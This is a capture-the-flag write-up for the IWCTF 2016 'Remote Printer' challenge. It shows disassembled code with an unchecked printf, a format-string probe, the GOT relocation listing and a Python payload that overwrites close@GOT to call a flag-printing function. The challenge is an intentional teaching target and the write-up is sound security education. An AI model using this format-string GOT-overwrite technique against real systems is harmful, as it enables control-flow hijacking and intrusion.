# IWCTF 2016 - Exploit - Remote Printer - 80 pts

> Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.
>
> Attachment: [exp80.zip](exp80.zip)
>
> Service: 188.166.133.53:12377 

# Write-up

Connecting to the specified address, we get an interface to enter an address and a port for a "remote printer".

So, let's start netcat in listening mode 

```shell
nc -lvvp 6666
```

and pass this as the remote printer. We'll see the service connects to our local netcat session and waits for some input. After entering some gibberish, the service just prints our input and closes.

Let's have a look at the disassembled code, that handles the communication:

```c
function sub_8048786 {
    esp = (esp - 0x4 - 0x4 - 0x4 - 0x4) + 0x10;
    var_C = socket(0x2, 0x1, 0x0);
    if (var_C == 0xffffffff) {
            puts("No socket :(");
    }
    else {
            inet_addr(arg0);
            htons();
            esp = (((esp - 0xc - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0x4 - 0x4 - 0x4 - 0x4) + 0x10;
            if (connect(var_C, 0x2, 0x10) < 0x0) {
                    perror("No communication :(\n");
            }
            else {
                    esp = (esp - 0x4 - 0x4 - 0x4 - 0x4) + 0x10;
                    if (recv(var_C, var_201C, 0x2000, 0x0) < 0x0) {
                            puts("No data :(");
                    }
                    else {
                            printf(var_201C);
                            close(var_C);
                    }
            }
    }
    return;
}
```

It just receives our input and prints it back via printf. But since it doesn't pass a format string, it seems to be a simple format string vulnerability.

Quick test:

```shell
$ nc -lvvp 6666
listening on [any] 6666 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 44112
AAAABBBB%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
 sent 44, rcvd 0
```

```shell
$ ./RemotePrinter 
This is a remote printer!
Enter IPv4 address:127.0.0.1
Enter port:6666
Thank you, I'm trying to print 127.0.0.1:6666 now!
AAAABBBBff8cd4fc.2000.0.0.0.0.41414141.42424242.252e7825.78252e78.2e78252e.252e7825
```

Ok, our format string shows up in the 7th and 8th parameter.

After printf the service calls `close`, so we can just overwrite close.plt.

```shell
$ objdump -R RemotePrinter 

RemotePrinter:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049c34 R_386_GLOB_DAT    __gmon_start__
08049c8c R_386_COPY        stdout
[SNIP]
08049c74 R_386_JUMP_SLOT   inet_addr
08049c78 R_386_JUMP_SLOT   connect
08049c7c R_386_JUMP_SLOT   recv
08049c80 R_386_JUMP_SLOT   close
```

Nicely enough the RemotePrinter service also contains a method, spitting out the flag quite happily, if called.

```C
function sub_8048867 {
    var_C = fopen(0x80489de, 0x80489dc);
    fgets(var_3E, 0x32, var_C);
    fclose(var_C);
    eax = printf("YAY, FLAG: %s\n", var_3E);
    return eax;
}
```

So all we have to do is to overwrite close (0x08049c80) with this one (0x08048867). 

Starting the service in gdb and adjusting the format string led to the following exploit:

```python
#!/usr/bin/python
import struct

def p(x):
	return struct.pack("<L", x)

CLOSE = 0x08049c80
SHOWFLAG = 0x08048867

payload = ""
payload += p(CLOSE)
payload += p(CLOSE+2)
payload += "%34911u%7$n"
payload += "%32669u%8$n"

print payload
```

After getting this working locally, all there's left to do is to open up a nc listener passing our payload:

```shell
$ python xpl.py | nc -lvvp 6666
listening on [any] 6666 ...
connect to [192.168.2.103] from serv1.2016.ctf.internetwache.org [178.62.254.108] 58820
 sent 31, rcvd 0
```

and asking the remote service to connect to us:

```shell
$ nc 188.166.133.53 12377
This is a remote printer!
Enter IPv4 address:87.149.209.194
Enter port:6666
Thank you, I'm trying to print 87.149.209.194:6666 now!
����                                                                                                                                       
[SNIP]
8192
YAY, FLAG: IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}
```
